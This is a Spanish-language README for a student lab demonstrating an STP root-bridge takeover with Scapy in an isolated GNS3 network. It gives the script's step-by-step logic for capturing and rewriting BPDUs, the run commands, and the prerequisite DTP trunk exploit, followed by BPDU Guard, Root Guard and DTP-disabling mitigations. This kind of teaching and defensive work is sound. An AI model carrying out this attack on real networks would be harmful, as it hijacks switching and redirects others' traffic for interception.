![Python](https://img.shields.io/badge/Python-3.x-blue?logo=python) ![Scapy](https://img.shields.io/badge/Scapy-2.x-green) ![GNS3](https://img.shields.io/badge/GNS3-vIOS--L2-orange) ![Lab](https://img.shields.io/badge/Lab-EGALDITO__LAB-red)

# STP Root Claim Attack (Root Bridge Takeover)

> **Autor:** Edgardy Olivero | **Matrícula:** 20250704
> **Laboratorio:** EGALDITO\_LAB | **Herramienta:** Python 3 + Scapy
> **Repositorio:** [github.com/Edgardy715/STP-Root-Claim](https://github.com/Edgardy715/STP-Root-Claim)

---

## 📋 Objetivo del Laboratorio

Demostrar cómo un atacante puede tomar control del proceso de elección STP (Spanning Tree Protocol) capturando y modificando BPDUs reales del switch para reclamar el rol de Root Bridge con prioridad 0, forzando una reconvergencia STP que reorienta el tráfico de la red hacia el atacante.

> **Prerequisito:** Este ataque requirió previamente explotar DTP (Dynamic Trunking Protocol) para poner el puerto de Kali en modo trunk. Esto fue posible porque SW2 tenía el puerto configurado como `switchport mode dynamic auto`, lo que permitió recibir los BPDUs nativos del switch antes de capturarlos y modificarlos. El script opera sobre `eth0` sin subinterfaz porque los BPDUs viajan sin etiqueta VLAN en el trunk nativo.

---

## 🎯 Objetivo del Script

Capturar un BPDU real enviado por SW2 (multicast `01:80:c2:00:00:00`), modificar en memoria los campos de prioridad, Root MAC y Bridge MAC para declarar a Kali como Root Bridge con prioridad 0 y path cost 0, y retransmitir este BPDU modificado cada 2 segundos hasta que SW2 reconverja y adopte a Kali como nuevo Root Bridge.

---

## 📁 Estructura del Repositorio

```text
STP-Root-Claim/
├── Script/
│   └── STP-Root-claim.py                 ← Script principal del ataque
├── Mitigacion/
│   └── Mitigacion-STP-Root-Claim.ios     ← Comandos BPDU Guard / Root Guard
├── Conf-Topologia/
│   └── scripts_bases_configs/
│       ├── R1.ios
│       ├── SW1-VTPSERVER.ios
│       └── SW2.ios
├── Topologia/
│   └── Topologia.png
└── README.md
```

---

## ⚙️ Parámetros del Script

| Campo modificado | Valor original (SW1/SW2) | Valor inyectado (Kali) | Efecto |
|---|---|---|---|
| `pkt[0].src` | MAC de SW2 | `kali_mac` | MAC origen del BPDU. |
| `pkt[0].rootid` | 32769 (SW1) | `0` | Prioridad Root declarada mínima. |
| `pkt[0].rootmac` | `0cb5.a4d7.0000` (SW1) | `kali_mac` | Root Bridge anunciado = Kali. |
| `pkt[0].bridgeid` | 32769 (SW2) | `0` | Prioridad del bridge = 0. |
| `pkt[0].bridgemac` | `0cc0.7fb8.0000` (SW2) | `kali_mac` | Bridge anunciado = Kali. |
| `pkt[0].pathcost` | 4 | `0` | Costo de ruta directo al root = 0. |
| `pkt[0].portid` | puerto real | `0` | Port ID mínimo. |
| `iface` | — | `eth0` | Interfaz en modo trunk (post-DTP). |
| `sleep(2)` | — | 2 segundos | Intervalo de reenvío de BPDU. |

---

## 🛠️ Requisitos

```bash
# Dependencias
pip install scapy

# PREREQUISITO: eth0 debe estar en modo trunk
# (logrado vía ataque DTP previo o configuración manual en el switch)

# Verificar que eth0 recibe BPDUs
tcpdump -i eth0 ether dst 01:80:c2:00:00:00 -c 1

# Ejecutar como root
sudo python3 Script/STP-Root-claim.py
```

---

## 🔍 Funcionamiento del Script

### Flujo de ejecución

```text
1. sniff(filter="ether dst 01:80:c2:00:00:00", count=1, timeout=10)
   → captura 1 BPDU real enviado por SW2
2. Si no llega BPDU en 10 segundos → error y salida
3. pkt.show() → muestra el BPDU original capturado
4. get_if_hwaddr(iface) → obtiene MAC real de Kali
5. Modifica el BPDU en memoria:
   pkt.src       = kali_mac
   pkt.rootid    = 0
   pkt.rootmac   = kali_mac
   pkt.bridgeid  = 0
   pkt.bridgemac = kali_mac
   pkt.pathcost  = 0
   pkt.portid    = 0
6. Bucle cada 2 segundos:
   → sendp(pkt_modificado, iface=eth0)
   → imprime número de BPDU enviado
7. Ctrl+C → muestra total e instrucciones de verificación
```

### BPDU original vs BPDU modificado

```text
Campo        Original (SW1/SW2)             Modificado (Kali)
-----------  -----------------------------  --------------------------
Root ID      32769                          0
Root MAC     0cb5.a4d7.0000 (SW1)           0c:bf:c5:c2:00:00 (Kali)
Bridge ID    32769                          0
Bridge MAC   0cc0.7fb8.0000 (SW2)           0c:bf:c5:c2:00:00 (Kali)
Path Cost    4 (enlace SW2-SW1)             0 (directo, sin costo)
```

### Verificación del éxito del ataque

```cisco
SW2# show spanning-tree vlan 1
  Root ID    Priority    0
             Address     0cbf.c5c2.0000
  ! Si aparece la MAC de Kali, el ataque fue exitoso
```

---

## 🌐 Documentación de la Red

### Topología del Laboratorio

```text
+------------------+        +---------------------+        +---------------------+
|   Kali Linux     |        |        SW2          |        |        SW1          |
|   (Atacante)     |◄──────►|  GNS3 vIOS-L2       |◄──────►|  GNS3 vIOS-L2       |
|     eth0 (trunk) | Gi0/1  | VTP Client          | Gi0/0  | VTP Server          |
| 0c:bf:c5:c2:00:00|        | 0cc0.7fb8.0000      |        | 0cb5.a4d7.0000      |
|   (post-DTP)     |        |                     |        | Root Bridge (orig.) |
+------------------+        +---------------------+        +---------------------+
                                                                    | Gi0/1
                                                         +---------------------+
                                                         |         R1          |
                                                         |  192.168.10.1/24    |
                                                         +---------------------+
```

> Topología completa disponible en `Topologia/Topologia.png`

### Tabla de Direccionamiento

| Dispositivo | Interfaz | VLAN | IP / Máscara | MAC | Rol |
|---|---|---|---|---|---|
| Kali Linux | `eth0` (trunk) | 1, 10 | dinámica | `0c:bf:c5:c2:00:00` | Atacante |
| SW1 | Gi0/0 (trunk) | 1, 10 | — | `0cb5.a4d7.0000` | VTP Server / Root Bridge original |
| SW2 | Gi0/1 (trunk) | 1, 10 | — | `0cc0.7fb8.0000` | VTP Client |
| R1 | Gi0/0 | 10 | 192.168.10.1/24 | — | Gateway / DHCP Server |

```text
VTP Domain  : EGALDITO_LAB
SW1         : VTP Server | STP Root Bridge | Priority 32769 | MAC 0cb5.a4d7.0000
SW2         : VTP Client
VLAN 10     : RED_LOCAL — 192.168.10.0/24

Antes del ataque  → Root Bridge: SW1  (Priority 32769 | MAC 0cb5.a4d7.0000)
Durante el ataque → Root Bridge: Kali (Priority 0     | MAC 0c:bf:c5:c2:00:00)
```

---

## 🛡️ Contramedidas

El archivo de mitigación está en `Mitigacion/Mitigacion-STP-Root-Claim.ios`.

### 1. BPDU Guard — defensa principal en puertos de acceso

```cisco
en
conf term
interface GigabitEthernet0/1
 spanning-tree portfast
 spanning-tree bpduguard enable
exit

! O habilitarlo globalmente en todos los puertos PortFast
spanning-tree portfast bpduguard default
do wr
```

> Si el puerto recibe un BPDU, se desactiva automáticamente (err-disabled). BPDU Guard está pensado para puertos de usuario donde no se espera recibir BPDUs bajo ninguna circunstancia.

### 2. Root Guard — protege puertos que no deben ver un nuevo Root

```cisco
interface GigabitEthernet0/1
 spanning-tree guard root
```

> Root Guard evita que un puerto acepte BPDUs superiores que intenten convertir a otro equipo en Root Bridge. A diferencia de BPDU Guard, no desactiva el puerto sino que lo pone en estado `root-inconsistent` mientras dure el ataque y lo recupera automáticamente al cesar.

### 3. Deshabilitar DTP — bloquea el prerequisito del ataque

```cisco
interface GigabitEthernet0/1
 switchport nonegotiate
 switchport mode access
```

> Sin acceso trunk, Kali no puede recibir BPDUs nativos del switch y el ataque no puede iniciarse.

### Verificación

```cisco
SW2# show spanning-tree inconsistentports
SW2# show interfaces GigabitEthernet0/1 status
```

---

## 🎬 Video Demostrativo

**Lista de reproducción EGALDITO\_LAB — Layer 2 Network Attacks:**
[https://www.youtube.com/playlist?list=PL24FUvJVT9rBmlkIyA1pGp28VHhh3JK1j](https://www.youtube.com/playlist?list=PL24FUvJVT9rBmlkIyA1pGp28VHhh3JK1j)

**Video de este ataque:**
[https://youtu.be/lppA9mMFDhc](https://youtu.be/lppA9mMFDhc)

---

*Laboratorio desarrollado con fines estrictamente educativos en entorno GNS3 aislado.*
*Autor: Edgardy Olivero | 20250704 | EGALDITO\_LAB*
